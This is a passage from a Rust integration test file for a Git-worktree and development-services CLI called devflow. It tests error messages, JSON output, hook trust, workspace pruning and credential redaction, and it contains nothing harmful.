    // Re-entry from a hook that devflow itself triggered is silent.
    let out = env
        .command(&env.repo)
        .args(["setup", "--if-new", "--from-git-hook"])
        .env("DEVFLOW_SETUP_ACTIVE", "1")
        .output()
        .unwrap();
    ok(&out);
    assert!(stderr(&out).is_empty(), "{}", describe(&out));
}

#[test]
fn db_commands_explain_a_missing_postgres_service() {
    let env = Env::new();
    env.init();
    for args in [
        ["db", "status"].as_slice(),
        ["db", "up"].as_slice(),
        ["db", "snapshot", "list"].as_slice(),
    ] {
        let out = env.run(args);
        failed(&out);
        assert!(
            stderr(&out).contains("[services.db]"),
            "{args:?}: {}",
            describe(&out)
        );
    }
    let out = env.run(&["--json", "db", "status"]);
    failed(&out);
    let doc = json(&out);
    assert_eq!(doc["version"], 1);
    assert_eq!(doc["command"], "db status");
    assert!(
        doc["error"].as_str().unwrap().contains("[services.db]"),
        "{doc}"
    );
}

#[test]
fn a_service_added_after_setup_makes_the_workspace_need_attention_until_setup() {
    let env = Env::new();
    env.init();
    ok(&env.run(&["--non-interactive", "setup"]));
    let doc = json(&env.run(&["--json", "list"]));
    assert_eq!(doc["workspaces"][0]["status"], "ready");
    // The services phase exists under its new name.
    assert_eq!(
        doc["workspaces"][0]["receipt"]["phases"]["services"]["state"],
        "skipped"
    );

    env.edit_config(
        "[hooks]",
        "[services.db]\nengine = \"postgres\"\nmode = \"external\"\n\n[hooks]",
    );
    let doc = json(&env.run(&["--json", "list"]));
    assert_eq!(doc["workspaces"][0]["status"], "needs_attention");
    let detail = doc["workspaces"][0]["receipt"]["phases"]["services"]["detail"]
        .as_str()
        .unwrap();
    assert!(detail.contains("service 'db' added"), "{detail}");

    // `--if-new` (the post-checkout hook) must not treat it as done; the
    // attachment completes it without a server.
    let out = env.run(&[
        "--json",
        "--non-interactive",
        "setup",
        "--if-new",
        "--database-url",
        "postgres://demo@127.0.0.1:1/appdb",
    ]);
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["status"], "ready", "{doc}");
    assert_eq!(doc["receipt"]["services"]["db"]["database"], "appdb");
    assert_eq!(doc["receipt"]["phases"]["services"]["state"], "done");
    let out = env.run(&["--json", "setup", "--if-new"]);
    ok(&out);
    assert_eq!(json(&out)["skipped"], true);
}

#[test]
fn snapshot_deletion_needs_a_version() {
    let env = Env::new();
    env.init();
    // The reference is validated before any server is contacted.
    let mut text = std::fs::read_to_string(env.config_path()).unwrap();
    text.push_str("\n[services.db]\nengine = \"postgres\"\nmode = \"external\"\n");
    std::fs::write(env.config_path(), text).unwrap();
    let out = env.run(&["db", "snapshot", "delete", "seed"]);
    failed(&out);
    assert!(stderr(&out).contains("NAME@vN"), "{}", describe(&out));
}

#[test]
fn phase_details_count_in_the_singular_when_there_is_one() {
    let env = Env::new();
    env.init();
    env.edit_config("setup = []", "setup = [\"true\"]");
    let switch = |name: &str| {
        let mut command = env.command(&env.repo);
        let out = command
            .args(["--json", "--non-interactive", "switch", "-c", name])
            .env("DEVFLOW_TRUST_HOOKS", "1")
            .output()
            .unwrap();
        ok(&out);
        json(&out)
    };
    let doc = switch("feature/one");
    assert_eq!(
        doc["receipt"]["phases"]["hooks"]["detail"], "1 command",
        "{doc}"
    );
    env.edit_config("setup = [\"true\"]", "setup = [\"true\", \"true\"]");
    let doc = switch("feature/two");
    assert_eq!(
        doc["receipt"]["phases"]["hooks"]["detail"], "2 commands",
        "{doc}"
    );
}

#[test]
fn id_arguments_take_the_short_ids_listings_show() {
    let env = Env::new();
    env.init();
    let mut text = std::fs::read_to_string(env.config_path()).unwrap();
    text.push_str("\n[services.cache]\nengine = \"valkey\"\n");
    std::fs::write(env.config_path(), text).unwrap();
    // A prefix of eight characters is understood and looked up: nothing is
    // recorded here, and the error says so rather than complaining about the
    // length ("invalid length: found 8").
    for id in [
        "105a6201",
        "105A6201-aaaa",
        "105a6201-aaaa-4bbb-8ccc-0123456789ab",
    ] {
        let out = env.run(&["service", "cache", "drop", id]);
        failed(&out);
        let text = stderr(&out);
        assert!(!text.contains("invalid length"), "{id}: {text}");
        assert!(!text.contains("not an id"), "{id}: {text}");
    }
    let out = env.run(&["service", "cache", "drop", "105a6201"]);
    assert!(
        stderr(&out).contains("no branch has an id starting with '105a6201'"),
        "{}",
        describe(&out)
    );
    // Shorter than the listing, or not hex: refused with what is accepted.
    for id in ["105a620", "nonsense-id"] {
        let out = env.run(&["service", "cache", "drop", id]);
        failed(&out);
        assert!(
            stderr(&out).contains("at least 8"),
            "{id}: {}",
            describe(&out)
        );
        let out = env.run(&["db", "branch", "delete", id]);
        failed(&out);
        assert!(
            stderr(&out).contains("at least 8"),
            "{id}: {}",
            describe(&out)
        );
    }
    let out = env.run(&["switch", "-c", "x", "--data-from", "branch:abc"]);
    failed(&out);
    assert!(stderr(&out).contains("at least 8"), "{}", describe(&out));
}

#[test]
fn service_help_lists_the_subcommands_and_the_coordinator_stays_hidden() {
    let env = Env::new();
    let root = stdout(ok(&env.run(&["--help"])));
    assert!(
        root.lines()
            .any(|line| line.trim_start().starts_with("service")),
        "{root}"
    );
    assert!(
        !root.contains("__clone"),
        "the coordinator is not advertised:\n{root}"
    );
    let service_line = root
        .lines()
        .find(|line| line.trim_start().starts_with("service"))
        .unwrap();
    assert!(
        service_line.contains("MySQL (preview)"),
        "the service command names every engine it serves: {service_line}"
    );
    let text = stdout(ok(&env.run(&["service", "--help"])));
    for command in [
        "status",
        "up",
        "down",
        "url",
        "list",
        "snapshot",
        "reset",
        "reconcile",
        "drop",
        "forget",
    ] {
        assert!(
            text.lines()
                .any(|line| line.trim_start().starts_with(command)),
            "`service {command}` missing:\n{text}"
        );
    }
    // The service name comes before the subcommand, and may be left out.
    for args in [
        ["service", "cache", "status", "--help"].as_slice(),
        ["service", "status", "--help"].as_slice(),
        ["service", "cache", "snapshot", "create", "--help"].as_slice(),
    ] {
        ok(&env.run(args));
    }
    let text = stdout(ok(&env.run(&["service", "list", "--help"])));
    assert!(text.contains("--orphans"), "{text}");
    let text = stdout(ok(&env.run(&["service", "status", "--help"])));
    assert!(text.contains("--probe"), "{text}");
    // The coordinator exists even though help does not show it.
    let out = env.run(&["__clone", "--help"]);
    ok(&out);
    assert!(stdout(&out).contains("PROJECT"), "{}", describe(&out));
}

#[test]
fn service_commands_explain_a_missing_unknown_or_ambiguous_service() {
    let env = Env::new();
    env.init();
    // No container service: nothing to talk to Docker about.
    let out = env.run(&["service", "status"]);
    failed(&out);
    assert!(
        stderr(&out).contains("[services.cache]"),
        "{}",
        describe(&out)
    );
    let out = env.run(&["--json", "service", "list"]);
    failed(&out);
    let doc = json(&out);
    assert_eq!(doc["command"], "service list");
    assert!(
        doc["error"]
            .as_str()
            .unwrap()
            .contains("no valkey, redis or mysql service"),
        "{doc}"
    );

    let mut text = std::fs::read_to_string(env.config_path()).unwrap();
    text.push_str(
        "\n[services.cache]\nengine = \"valkey\"\n\n[services.queue]\nengine = \"redis\"\n\
         env = \"QUEUE_URL\"\n",
    );
    std::fs::write(env.config_path(), text).unwrap();
    // Two services and no name: the command says which exist.
    let out = env.run(&["service", "up"]);
    failed(&out);
    let message = stderr(&out);
    assert!(
        message.contains("2 container services (cache, queue)"),
        "{}",
        describe(&out)
    );
    // An unknown name lists the configured ones.
    let out = env.run(&["service", "nope", "up"]);
    failed(&out);
    assert!(
        stderr(&out).contains("no container service 'nope'")
            && stderr(&out).contains("cache, queue"),
        "{}",
        describe(&out)
    );
    // A configured service is never forgotten.
    let out = env.run(&["service", "cache", "forget"]);
    failed(&out);
    assert!(
        stderr(&out).contains("still configured"),
        "{}",
        describe(&out)
    );
    let out = env.run(&["service", "forget"]);
    failed(&out);
    assert!(
        stderr(&out).contains("name the service"),
        "{}",
        describe(&out)
    );
    // Deleting a snapshot needs NAME@vN, before Docker is asked anything.
    let out = env.run(&["service", "cache", "snapshot", "delete", "seed"]);
    failed(&out);
    assert!(stderr(&out).contains("NAME@vN"), "{}", describe(&out));
}

#[test]
fn a_container_service_that_shares_a_variable_is_a_configuration_error_naming_both() {
    let env = Env::new();
    env.init();
    let mut text = std::fs::read_to_string(env.config_path()).unwrap();
    text.push_str(
        "\n[services.cache]\nengine = \"valkey\"\n\n[services.queue]\nengine = \"redis\"\n",
    );
    std::fs::write(env.config_path(), text).unwrap();
    let out = env.run(&["list"]);
    failed(&out);
    assert!(
        stderr(&out).contains("services.cache and services.queue both export the same variable"),
        "{}",
        describe(&out)
    );
    // A container service takes no postgres option.
    env.edit_config(
        "services.queue]\nengine = \"redis\"",
        "services.queue]\nengine = \"redis\"\nmode = \"external\"",
    );
    let out = env.run(&["list"]);
    failed(&out);
    assert!(
        stderr(&out).contains("`mode` is not available for redis services"),
        "{}",
        describe(&out)
    );
}

// --- need the workspace pipeline of devflow-core -----------------------------

#[test]
fn list_json_has_the_versioned_envelope() {
    let env = Env::new();
    env.init();
    let out = env.run(&["--json", "list"]);
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["version"], 1);
    assert_eq!(doc["command"], "list");
    assert_eq!(doc["project"]["name"], "shop");
    let workspaces = doc["workspaces"].as_array().unwrap();
    assert_eq!(workspaces.len(), 1, "{doc}");
    assert_eq!(workspaces[0]["workspace"]["is_default"], true);
    assert!(stderr(&out).is_empty(), "{}", describe(&out));

    let out = env.run(&["--json", "list", "--all"]);
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["projects"][0]["name"], "shop");
    assert_eq!(
        doc["projects"][0]["workspaces"].as_array().unwrap().len(),
        1
    );
}

#[test]
fn switch_create_list_path_and_remove_without_postgres() {
    let env = Env::new();
    env.init();

    let out = env.run(&["--json", "--non-interactive", "switch", "-c", "feature/a"]);
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["version"], 1);
    assert_eq!(doc["command"], "switch");
    assert_eq!(doc["created"], true);
    assert_eq!(doc["status"], "ready", "{doc}");
    let path = PathBuf::from(doc["path"].as_str().unwrap());
    assert!(path.is_dir(), "{}", path.display());

    let doc = json(&env.run(&["--json", "list"]));
    let names: Vec<&str> = doc["workspaces"]
        .as_array()
        .unwrap()
        .iter()
        .map(|w| w["workspace"]["name"].as_str().unwrap())
        .collect();
    assert!(names.contains(&"feature/a"), "{names:?}");
    let item = doc["workspaces"]
        .as_array()
        .unwrap()
        .iter()
        .find(|w| w["workspace"]["name"] == "feature/a")
        .unwrap();
    assert_eq!(item["status"], "ready");

    let human = env.run(&["list"]);
    ok(&human);
    let table = stdout(&human);
    let line = table.lines().find(|l| l.contains("feature/a")).unwrap();
    assert!(line.contains("ready"), "{table}");
    assert!(table.lines().next().unwrap().contains("STATUS"), "{table}");

    let out = env.run(&["path", "feature/a"]);
    ok(&out);
    assert!(same_path(&stdout(&out), &path), "{}", describe(&out));

    // Without the shell wrapper, `switch` prints the path on stdout.
    let out = env.run(&["--non-interactive", "switch", "feature/a"]);
    ok(&out);
    assert!(same_path(&stdout(&out), &path), "{}", describe(&out));

    // With the wrapper's handoff file, it writes the path there instead.
    let handoff = env.root.join("cd-file");
    std::fs::write(&handoff, "").unwrap();
    let out = env
        .command(&env.repo)
        .args(["--non-interactive", "switch", "feature/a"])
        .env("DEVFLOW_CD_FILE", &handoff)
        .output()
        .unwrap();
    ok(&out);
    assert!(stdout(&out).is_empty(), "{}", describe(&out));
    assert!(same_path(
        &std::fs::read_to_string(&handoff).unwrap(),
        &path
    ));

    // JSON mode never moves the caller's shell.
    std::fs::write(&handoff, "").unwrap();
    let out = env
        .command(&env.repo)
        .args(["--json", "switch", "feature/a"])
        .env("DEVFLOW_CD_FILE", &handoff)
        .output()
        .unwrap();
    ok(&out);
    assert!(std::fs::read_to_string(&handoff).unwrap().is_empty());

    // The workspace containing the caller's directory is protected.
    let out = env.run_in(&path, &["remove", "feature/a"]);
    failed(&out);
    assert!(path.is_dir());

    let out = env.run(&["--json", "remove", "feature/a"]);
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["command"], "remove");
    assert_eq!(doc["workspace"]["name"], "feature/a");
    assert!(!path.exists(), "{}", path.display());
    let doc = json(&env.run(&["--json", "list"]));
    assert_eq!(doc["workspaces"].as_array().unwrap().len(), 1);
}

#[test]
fn prune_lists_first_forgets_only_what_owns_nothing_and_sends_the_rest_to_remove() {
    let env = Env::new();
    env.init();
    let make = |name: &str| {
        let out = env.run(&["--json", "--non-interactive", "switch", "-c", name]);
        ok(&out);
        PathBuf::from(json(&out)["path"].as_str().unwrap())
    };
    let plain = make("feature/plain");
    let owner = make("feature/owner");
    // The second one records a branch being created: data only the normal
    // removal knows how to drop.
    let receipt = env
        .repo
        .join(".git/worktrees/feature-owner/devflow/receipt.json");
    let mut doc: Value = serde_json::from_slice(&std::fs::read(&receipt).unwrap()).unwrap();
    doc["creating"] = json!({"service": "cache", "branch_id": uuid::Uuid::new_v4()});
    std::fs::write(&receipt, serde_json::to_vec_pretty(&doc).unwrap()).unwrap();
    std::fs::remove_dir_all(&plain).unwrap();
    std::fs::remove_dir_all(&owner).unwrap();

    // Without --yes nothing is forgotten: the list is the review.
    let doc = json(ok(&env.run(&["--json", "prune"])));
    assert_eq!(doc["command"], "prune");
    assert_eq!(doc["confirmed"], false, "{doc}");
    assert_eq!(doc["pruned"], json!([]), "{doc}");
    let candidates = doc["candidates"].as_array().unwrap();
    assert_eq!(candidates.len(), 2, "{doc}");
    let by = |name: &str| candidates.iter().find(|c| c["name"] == name).unwrap();
    assert!(by("feature/plain").get("refusal").is_none(), "{doc}");
    assert_eq!(by("feature/owner")["refusal"]["kind"], "owns_data", "{doc}");
    assert_eq!(
        by("feature/owner")["remedies"][0]["kind"],
        "remove_workspace",
        "{doc}"
    );
    assert_eq!(by("feature/owner")["has_receipt"], true, "{doc}");
    assert!(
        by("feature/owner")["why"]
            .as_str()
            .unwrap()
            .contains("does not exist"),
        "{doc}"
    );
    let listed = json(&env.run(&["--json", "list"]));
    assert_eq!(
        listed["workspaces"].as_array().unwrap().len(),
        3,
        "{listed}"
    );
    // The terminal says the same and changes nothing either.
    let text = stdout(ok(&env.run(&["--non-interactive", "prune"])));
    assert!(text.contains("can be forgotten") && text.contains("kept: it still owns"));
    assert!(receipt.is_file());

    // --yes forgets what owns nothing; the owner stays with its receipt.
    let doc = json(ok(&env.run(&["--json", "prune", "--yes"])));
    assert_eq!(doc["pruned"], json!(["feature/plain"]), "{doc}");
    assert_eq!(doc["refused"], json!([]), "{doc}");
    assert!(receipt.is_file(), "the receipt is kept");

    // Naming it explicitly is refused with the way on.
    let out = env.run(&["--json", "prune", "feature/owner", "--yes"]);
    failed(&out);
    let doc = json(&out);
    assert_eq!(doc["pruned"], json!([]), "{doc}");
    assert_eq!(doc["refused"][0]["refusal"]["kind"], "owns_data", "{doc}");
    assert_eq!(
        doc["refused"][0]["remedies"][0]["command"], "devflow remove feature/owner",
        "{doc}"
    );
    assert!(receipt.is_file());
    // A run that exits 1 has an `error` like every other failure, with the way
    // on at the top, and the partial results stay in the same document.
    let error = doc["error"].as_str().expect("an error is reported");
    assert!(
        error.contains("1 worktree was kept") && error.contains("feature/owner"),
        "{doc}"
    );
    assert_eq!(doc["remedies"][0]["kind"], "remove_workspace", "{doc}");
    assert_eq!(
        doc["remedies"][0]["command"], "devflow remove feature/owner",
        "{doc}"
    );
    assert!(
        doc["hint"].as_str().unwrap().contains("devflow remove"),
        "{doc}"
    );
    assert_eq!(doc["confirmed"], true, "{doc}");
    assert!(doc["candidates"].is_array(), "{doc}");
    // A run that kept nothing has no `error` and exits 0.
    let doc = json(ok(&env.run(&["--json", "prune"])));
    assert!(
        doc.get("error").is_none() && doc.get("remedies").is_none(),
        "{doc}"
    );
    failed(&env.run(&["--json", "prune", "feature/nope", "--yes"]));
}

/// Make `origin/<name>` hold a colleague's commit (one new file) in the test
/// repository, as a fresh clone would after `git clone`.
fn colleague_branch(env: &Env, name: &str, file: &str) -> git2::Oid {
    let git = git2::Repository::open(&env.repo).unwrap();
    if git.find_remote("origin").is_err() {
        git.remote("origin", "https://example.invalid/shop.git")
            .unwrap();
    }
    let parent = git.head().unwrap().peel_to_commit().unwrap();
    let blob = git.blob(b"from a colleague\n").unwrap();
    let mut builder = git.treebuilder(Some(&parent.tree().unwrap())).unwrap();
    builder.insert(file, blob, 0o100644).unwrap();
    let tree = git.find_tree(builder.write().unwrap()).unwrap();
    let sig = git2::Signature::now("Colleague", "colleague@example.com").unwrap();
    let id = git
        .commit(None, &sig, &sig, "colleague", &tree, &[&parent])
        .unwrap();
    git.reference(&format!("refs/remotes/origin/{name}"), id, true, "fetch")
        .unwrap();
    id
}

#[test]
fn switch_create_starts_from_the_remote_branch_of_that_name_and_tracks_it() {
    let env = Env::new();
    env.init();
    let id = colleague_branch(&env, "feature-x", "colleague.txt");
    let out = env.run(&["--json", "--non-interactive", "switch", "-c", "feature-x"]);
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["status"], "ready", "{doc}");
    assert_eq!(doc["branch_start"]["commit"], id.to_string(), "{doc}");
    assert_eq!(doc["branch_start"]["tracks"], "origin/feature-x", "{doc}");
    assert_eq!(
        doc["branch_start"]["start"]["kind"], "remote_branch",
        "{doc}"
    );
    let path = PathBuf::from(doc["path"].as_str().unwrap());
    assert!(path.join("colleague.txt").is_file());
    let config = git2::Repository::open(&env.repo).unwrap().config().unwrap();
    assert_eq!(
        config.get_string("branch.feature-x.remote").unwrap(),
        "origin"
    );
    assert_eq!(
        config.get_string("branch.feature-x.merge").unwrap(),
        "refs/heads/feature-x"
    );
    // The materialize phase says it in words, too.
    let detail = doc["receipt"]["phases"]["materialize"]["detail"]
        .as_str()
        .unwrap();
    assert!(detail.contains("tracking origin/feature-x"), "{detail}");

    // A name no remote has starts from the default workspace, as before.
    let doc = json(&env.run(&["--json", "--non-interactive", "switch", "-c", "plain"]));
    assert_eq!(
        doc["branch_start"]["start"]["kind"], "default_workspace",
        "{doc}"
    );
    assert!(doc["branch_start"].get("tracks").is_none(), "{doc}");
}

#[test]
fn switch_create_base_starts_a_new_branch_at_any_commit_ish() {
    let env = Env::new();
    env.init();
    let id = colleague_branch(&env, "other", "other.txt");
    let out = env.run(&[
        "--json",
        "--non-interactive",
        "switch",
        "-c",
        "mine",
        "--base",
        "origin/other",
    ]);
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["branch_start"]["commit"], id.to_string(), "{doc}");
    assert_eq!(
        doc["branch_start"]["start"]["spec"], "origin/other",
        "{doc}"
    );
    assert!(doc["branch_start"].get("tracks").is_none(), "{doc}");
    assert!(
        PathBuf::from(doc["path"].as_str().unwrap())
            .join("other.txt")
            .is_file()
    );

    // A starting point that does not exist is a plain error and creates nothing.
    let out = env.run(&["switch", "-c", "ghost", "--base", "no-such-thing"]);
    failed(&out);
    let text = stderr(&out);
    assert!(
        text.contains("no-such-thing") && !text.contains("class="),
        "{text}"
    );
    assert!(
        !json(&env.run(&["--json", "list"]))["workspaces"]
            .to_string()
            .contains("ghost")
    );
    // --base only makes sense with -c.
    failed(&env.run(&["switch", "mine", "--base", "main"]));
}

#[test]
fn a_repository_with_git_lfs_is_refused_with_a_way_on() {
    let env = Env::new();
    env.init();
    std::fs::write(
        env.repo.join(".gitattributes"),
        "*.psd filter=lfs diff=lfs merge=lfs -text\n",
    )
    .unwrap();
    let git = git2::Repository::open(&env.repo).unwrap();
    let mut index = git.index().unwrap();
    index.add_path(Path::new(".gitattributes")).unwrap();
    index.write().unwrap();
    let tree = git.find_tree(index.write_tree().unwrap()).unwrap();
    let sig = git2::Signature::now("Test", "test@example.com").unwrap();
    let parent = git.head().unwrap().peel_to_commit().unwrap();
    git.commit(Some("HEAD"), &sig, &sig, "lfs", &tree, &[&parent])
        .unwrap();

    let out = env.run(&["--non-interactive", "switch", "-c", "lfs-work"]);
    failed(&out);
    let text = stderr(&out);
    assert!(text.contains("Git LFS"), "{text}");
    assert!(text.contains("hint:"), "{text}");
    assert!(!text.contains("class="), "{text}");
    assert!(
        !json(&env.run(&["--json", "list"]))["workspaces"]
            .to_string()
            .contains("lfs-work")
    );
}

#[test]
fn switching_to_a_missing_workspace_suggests_create() {
    let env = Env::new();
    env.init();
    let out = env.run(&["switch", "nope"]);
    failed(&out);
    let text = stderr(&out);
    assert!(text.contains("switch -c nope"), "{text}");
    failed(&env.run(&["path", "nope"]));
}

#[test]
fn untrusted_hooks_need_attention_until_trusted() {
    let env = Env::new();
    env.init();
    let text = std::fs::read_to_string(env.config_path()).unwrap();
    assert!(text.contains("setup = []"));
    std::fs::write(
        env.config_path(),
        text.replace("setup = []", "setup = [\"echo ran > hook-ran.txt\"]"),
    )
    .unwrap();

    // Non-interactive and untrusted: the worktree is kept, hooks do not run, exit 2.
    let out = env.run(&["--json", "--non-interactive", "switch", "-c", "feature/h"]);
    assert_eq!(out.status.code(), Some(2), "{}", describe(&out));
    let doc = json(&out);
    assert_eq!(doc["status"], "needs_attention", "{doc}");
    let path = PathBuf::from(doc["path"].as_str().unwrap());
    assert!(path.is_dir());
    assert!(!path.join("hook-ran.txt").exists());

    // Human mode says what to do.
    let out = env.run(&["--non-interactive", "switch", "-c", "feature/h2"]);
    assert_eq!(out.status.code(), Some(2), "{}", describe(&out));
    assert!(stderr(&out).contains("devflow trust"), "{}", describe(&out));
    assert!(
        !stdout(&out).is_empty(),
        "the path is still printed: {}",
        describe(&out)
    );

    let doc = json(&env.run(&["--json", "trust"]));
    assert_eq!(doc["command"], "trust");
    assert_eq!(doc["trust"]["state"], "untrusted", "{doc}");
    assert_eq!(doc["approved"], false);

    let doc = json(ok(&env.run(&["--json", "trust", "--yes"])));
    assert_eq!(doc["approved"], true);
    assert_eq!(doc["trust"]["state"], "trusted", "{doc}");

    // `setup` resumes the skipped phase and finishes.
    let out = env.run_in(&path, &["--json", "--non-interactive", "setup"]);
    ok(&out);
    assert_eq!(json(&out)["status"], "ready");
    assert!(path.join("hook-ran.txt").is_file());

    let doc = json(ok(&env.run(&["--json", "trust", "--revoke"])));
    assert_eq!(doc["revoked"], true);

    // DEVFLOW_TRUST_HOOKS=1 trusts for one run only.
    let out = env
        .command(&env.repo)
        .args(["--json", "--non-interactive", "switch", "-c", "feature/i"])
        .env("DEVFLOW_TRUST_HOOKS", "1")
        .output()
        .unwrap();
    ok(&out);
    let doc = json(&out);
    assert_eq!(doc["status"], "ready", "{doc}");
    assert!(
        Path::new(doc["path"].as_str().unwrap())
            .join("hook-ran.txt")
            .is_file()
    );
    assert_eq!(
        json(&env.run(&["--json", "trust"]))["trust"]["state"],
        "untrusted"
    );
}

#[test]
fn hook_install_and_uninstall_round_trip() {
    let env = Env::new();
    env.init();
    let doc = json(ok(&env.run(&["--json", "hook", "install"])));
    assert_eq!(doc["command"], "hook install");
    assert_eq!(doc["installed"], true);
    let hook = PathBuf::from(doc["path"].as_str().unwrap());
    assert!(hook.is_file(), "{}", hook.display());
    let doc = json(ok(&env.run(&["--json", "hook", "uninstall"])));
    assert_eq!(doc["removed"], true);
    assert!(!hook.exists());
}

#[test]
fn a_hook_somebody_else_wrote_is_left_alone_and_the_line_to_add_is_the_hint() {
    let env = Env::new();
    env.init();
    let hook = env.repo.join(".git/hooks/post-checkout");
    std::fs::create_dir_all(hook.parent().unwrap()).unwrap();
    let original = "#!/bin/sh\necho mine\n";
    std::fs::write(&hook, original).unwrap();
    #[cfg(unix)]
    {
        use std::os::unix::fs::PermissionsExt;
        std::fs::set_permissions(&hook, std::fs::Permissions::from_mode(0o755)).unwrap();
    }

    let out = env.run(&["--json", "hook", "install"]);
    failed(&out);
    let doc = json(&out);
    // The message is plain words; the line to add is the hint, and the app's
    // buttons are the remedies.
    let error = doc["error"].as_str().unwrap();
    assert!(
        error.contains("already has a post-checkout hook from another tool"),
        "{doc}"
    );
    assert!(error.contains("devflow does not edit it"), "{doc}");
    assert!(!error.contains("--from-git-hook"), "{doc}");
    let line = devflow_core::githook::HOOK_LINE;
    assert!(doc["hint"].as_str().unwrap().contains(line), "{doc}");
    assert_eq!(doc["remedies"][0]["kind"], "copy_hook_line", "{doc}");
    assert_eq!(doc["remedies"][0]["destructive"], false, "{doc}");
    assert!(doc["remedies"][0].get("command").is_none(), "{doc}");
    assert_eq!(doc["remedies"][1]["kind"], "open_file", "{doc}");
    assert_eq!(doc["remedies"][1]["label"], "Open the hook", "{doc}");
    assert_eq!(std::fs::read_to_string(&hook).unwrap(), original);
    let text = stderr(&env.run(&["hook", "install"]));
    assert!(text.contains(&format!(
        "hint: add this line at the end of {}",
        hook.display()
    )));
    assert!(text.contains(line), "{text}");

    // There is no `--chain`, and nothing of the hook was moved.
    failed(&env.run(&["hook", "install", "--chain"]));
    assert_eq!(std::fs::read_to_string(&hook).unwrap(), original);
    assert!(
        !hook
            .with_file_name("post-checkout.devflow-original")
            .exists()
    );

    // Uninstall never touches a hook devflow did not write.
    let doc = json(ok(&env.run(&["--json", "hook", "uninstall"])));
    assert_eq!(doc["removed"], false, "{doc}");
    assert_eq!(std::fs::read_to_string(&hook).unwrap(), original);

    // Once the person added the line, the doctor counts it as configured.
    std::fs::write(&hook, format!("{original}{line}\n")).unwrap();
    let doc = json(&env.run(&["--json", "doctor"]));
    let check = doc["checks"]
        .as_array()
        .unwrap()
        .iter()
        .find(|c| c["name"] == "git-hook")
        .unwrap();
    assert_eq!(check["status"], "ok", "{check}");
}

#[test]
fn doctor_reports_checks() {
    let env = Env::new();
    env.init();
    let out = env.run(&["--json", "doctor"]);
    assert!(
        matches!(out.status.code(), Some(0 | 1)),
        "{}",
        describe(&out)
    );
    let doc = json(&out);
    assert_eq!(doc["command"], "doctor");
    assert!(
        doc["checks"].as_array().is_some_and(|c| !c.is_empty()),
        "{doc}"
    );
    assert_eq!(doc["ok"], out.status.success());
}

#[test]
fn doctor_prints_each_fix_as_a_hint_and_carries_it_as_a_remedy() {
    let env = Env::new();
    env.init();
    // No Git hook yet: the check explains in words, the fix is a remedy.
    let doc = json(&env.run(&["--json", "doctor"]));
    let hook = doc["checks"]
        .as_array()
        .unwrap()
        .iter()
        .find(|check| check["name"] == "git-hook")
        .unwrap();
    assert_eq!(hook["status"], "warn", "{hook}");
    assert!(
        !hook["hint"].as_str().unwrap().contains("`devflow"),
        "{hook}"
    );
    assert_eq!(hook["remedies"][0]["kind"], "install_git_hook", "{hook}");
    assert_eq!(
        hook["remedies"][0]["command"], "devflow hook install",
        "{hook}"
    );

    let out = env.run(&["doctor"]);
    let text = String::from_utf8_lossy(&out.stdout).to_string();
    assert!(text.contains("hint: run `devflow hook install`"), "{text}");
}

// --- review regressions -------------------------------------------------------

/// Run with `DEVFLOW_NON_INTERACTIVE=value`.
fn run_with_non_interactive(env: &Env, value: &str, args: &[&str]) -> Output {
    env.command(&env.repo)
        .args(args)
        .env("DEVFLOW_NON_INTERACTIVE", value)
        .output()
        .unwrap()
}

#[test]
fn non_interactive_environment_variable_accepts_boolean_spellings() {
    let env = Env::new();
    env.init();
    for value in ["1", "0", "true", "false", "TRUE", "yes", "no", "on", "off"] {
        let out = run_with_non_interactive(&env, value, &["--json", "list"]);
        assert!(
            out.status.success(),
            "DEVFLOW_NON_INTERACTIVE={value}\n{}",
            describe(&out)
        );
        assert_eq!(json(&out)["command"], "list");
    }
    // Anything else is still an error, and a JSON one when --json was asked for.
    let out = run_with_non_interactive(&env, "maybe", &["--json", "list"]);
    failed(&out);
    let doc = json(&out);
    assert_eq!(doc["command"], "list");
    assert!(
        doc["error"].as_str().unwrap().contains("--non-interactive"),
        "{doc}"
    );
}

#[test]
fn json_mode_reports_every_early_failure_as_one_document() {
    let env = Env::new();
    env.init();
    for (args, command, mentions) in [
        (vec!["--json", "path"], "path", "NAME"),
        (
            vec!["--json", "-C", "/nonexistent/devflow-dir", "list"],
            "list",
            "cannot use -C",
        ),
        (vec!["--json", "bogus"], "devflow", "bogus"),
        (
            vec!["--json", "db", "snapshot", "create"],
            "db snapshot create",
            "NAME",
        ),
        (vec!["--json", "--bogus", "list"], "list", "--bogus"),
        (vec!["list", "--oops", "--json"], "list", "--oops"),
        (
            vec!["--json", "db", "branch", "delete", "x"],
            "db branch delete",
            "x",
        ),
    ] {
        let out = env.run(&args);
        failed(&out);
        let doc = json(&out);
        assert_eq!(doc["version"], 1, "{args:?}");
        assert_eq!(doc["command"], command, "{args:?}: {doc}");
        let message = doc["error"].as_str().unwrap();
        assert!(message.contains(mentions), "{args:?}: {doc}");
        assert!(!message.starts_with("error:"), "{args:?}: {doc}");
        assert!(!stderr(&out).is_empty(), "{args:?}: {}", describe(&out));
    }

    // --help and --version keep clap's behavior.
    for flag in ["--help", "--version"] {
        let out = env.run(&["--json", flag]);
        ok(&out);
        assert!(
            serde_json::from_slice::<Value>(&out.stdout).is_err(),
            "{flag}: {}",
            describe(&out)
        );
        assert!(stdout(&out).contains("devflow") || stdout(&out).contains("Git worktrees"));
    }
}

#[test]
fn argument_errors_do_not_echo_credentials() {
    let env = Env::new();
    env.init();
    let url = "postgres://u:SECRETPW@h/db?password=SECRETQUERY";
    for args in [
        ["--json", "db", "branch", "delete", url].as_slice(),
        ["db", "branch", "delete", url].as_slice(),
    ] {
        let out = env.run(args);
        failed(&out);
        let text = describe(&out);
        assert!(
            !text.contains("SECRETPW") && !text.contains("SECRETQUERY"),
            "{args:?}\n{text}"
        );
        assert!(text.contains("invalid value"), "{args:?}\n{text}");
    }
}

#[test]
fn configuration_errors_name_the_key_and_never_echo_a_value() {
    const MARK: &str = "REVIEWSECRET";
    let env = Env::new();
    let head = "[project]\nname = \"shop\"\nid = \"0b3c9d2e-1111-4222-8333-444455556666\"\n";
    // (the broken part of devflow.toml, what the error must say instead)
    let broken = [
        (
            format!("[env]\nAUTH = \"${{UNSET:-{MARK}}}\"\n"),
            "env.AUTH: unsupported reference syntax",
        ),
        (
            format!(
